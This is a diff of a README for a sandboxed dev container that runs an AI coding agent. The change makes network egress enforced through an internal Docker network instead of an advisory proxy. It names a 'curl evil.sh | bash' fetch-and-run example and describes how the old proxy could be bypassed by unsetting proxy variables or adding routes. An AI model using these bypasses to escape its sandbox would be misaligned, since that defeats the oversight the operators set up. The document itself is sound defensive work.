@@ -5,7 +5,7 @@ A disposable, isolated dev container for running Claude Code in `--dangerously-s
 ## What's enforced
 
 - **Git is local-only.** No SSH keys. No GitHub tokens. No `gh` CLI. Pre-push hook hard-fails any push attempt. The container has full local git — branches, commits, rebases, stashes — but nothing leaves.
-- **Network egress is filtered.** Squid forward proxy with a blocklist (URLhaus + ThreatFox + HaGeZi-TIF, refreshed every 6h) and a state-actor TLD policy. Quad9 as DNS upstream. Yolo Claude cannot `curl evil.sh | bash`.
+- **Network egress is enforced.** The session bridge is a Docker `internal` network — no NAT, so there is no route out except through the Squid sidecar. Blocklist (URLhaus + ThreatFox + HaGeZi-TIF, refreshed every 6h), state-actor TLD policy, Quad9 upstream. Not just `HTTP_PROXY`: a privileged process that strips the proxy vars and adds its own route still gets `Network is unreachable`.
 - **Docker is isolated.** DinD inside the sandbox. The host Docker daemon is unreachable. Claude can build and run images; they live and die with the session.
 - **Compromise is detected and recovered.** A policy sidecar tails the proxy log. A malware-list hit writes a taint flag, optionally pauses the container. Recovery is `aidc kill` + `aidc create`, not "clean up."
 - **Everything is audited.** Squid access log, shell history, Claude session transcript, policy events — all preserved on host after `aidc kill`.
@@ -209,6 +209,53 @@ the session's own network, which also keeps the default route, so ordinary egres
 leaves through the proxied path instead of silently rerouting through the network you
 attached. (That last part needs `gw_priority`, so declared attachments require Docker
 Compose 2.34+; `aidc create` checks and tells you if yours is older.)
+
+### Egress is enforced, not requested
+
+The session bridge is a Docker **`internal`** network. Docker installs no NAT for
+it, so there is no route to the internet at all — squid, dual-homed onto a
+separate egress network, is the only way out.
+
+That distinction matters. Before v1.3.0 the proxy was advisory: `HTTP_PROXY`
+pointed at squid, but `env -u HTTP_PROXY curl https://example.com` returned 200
+and left no trace in `access.log`, so the blocklist didn't apply and taint
+detection couldn't see it. The dev container is `--privileged` (it needs DinD),
+so any rule *inside* it can be flushed by whatever is running there — enforcement
+has to live where the agent can't reach. Now a privileged process that adds its
+own default route, enables `ip_forward`, and installs its own `MASQUERADE` still
+gets `Network is unreachable`.
+
+Only `squid`, `refresher` (fetches threat feeds) and `policy` (POSTs the taint
+webhook) sit on the egress network. `dev` and `audit` never do.
+
+**Two deliberate ways out**, both visible:
+
+```bash
+aidc create myproj --egress direct     # restores the old NATed bridge
+```
+
+```yaml
+egress: direct                          # or in .aidc/config.yaml
+```
+
+Use it when a session needs reachability an attached network can't provide —
+ZeroTier/Tailscale hosts, direct DNS. `aidc create` tells you plainly that
+enforcement is off for that session.
+
+The other is attaching a network (below): it grants whatever that network grants,
+and most compose bridges are NATed, so attaching one restores general internet
+egress as a side effect. aidc can't prevent that — it doesn't own that network.
+Detaching closes it again.
+
+**Existing sessions are not converted.** `aidc upgrade` reuses the compose file rendered
+at create time, so a session created before v1.3.0 keeps its NATed bridge — upgraded, but
+still bypassable. `aidc status <name>` reports which posture a session is in, and
+`aidc upgrade` warns before preserving an unenforced one. Recreate to convert:
+`aidc kill <name> && aidc create <name> ...`.
+
+Declared `--port` forwards and `aidc proxy` still work: each becomes a small
+dual-homed `aidc/forwarder` sidecar that publishes the host port and reaches dev
+across the internal bridge, since an internal network can't publish ports itself.
 
 ### Per-session DNS (overlay networks like ZeroTier / Tailscale)
 
@@ -518,7 +565,7 @@ aidc attach <name>
 
 | Command | What it does |
 |---------|--------------|
-| `aidc create <name> [--profile P] [--repo PATH] [--workspace PATH] [--port H:C ...] [--dns IP ...] [--network NET ...]` | Start a session. ~30s. `--port` declares published ports baked into compose. `--dns` overrides Quad9 for sessions needing overlay-network resolution (applies to both container and squid). `--network` attaches the dev container to an existing docker bridge so it can reach another stack's services; repeatable, merges with the `networks:` config list. |
+| `aidc create <name> [--profile P] [--repo PATH] [--workspace PATH] [--port H:C ...] [--dns IP ...] [--network NET ...] [--egress proxied\|direct]` | Start a session. ~30s. `--port` declares published ports baked into compose. `--dns` overrides Quad9 for sessions needing overlay-network resolution (applies to both container and squid). `--network` attaches the dev container to an existing docker bridge so it can reach another stack's services; repeatable, merges with the `networks:` config list. `--egress direct` disables enforced egress (see "Egress is enforced"). |
 | `aidc list` | All sessions; status + taint flag. |
 | `aidc status <name>` | Component health, taint, declared + adhoc ports, attached networks, audit dir path. |
 | `aidc attach <name>` | `docker exec -it -u vscode` into tmux. |
@@ -595,6 +642,12 @@ dns_servers:                          # OVERRIDES Quad9 when set (no merge; orde
                                       # Applies to container lookups AND squid's resolution.
   - 10.147.17.1                       #   e.g. ZeroTier-managed DNS
   - 9.9.9.9                           #   explicit Quad9 fallback
+
+egress: proxied                       # proxied (default) | direct. proxied makes the
+                                      # session bridge a Docker `internal` network -- no NAT,
+                                      # so the ONLY route out is squid. direct restores the
+                                      # pre-v1.3.0 NATed bridge (proxy still configured, but
+                                      # nothing stops a process going around it).
 
 networks:                             # foreign docker bridges the dev container attaches to,
                                       # so the session can reach that stack by container name.
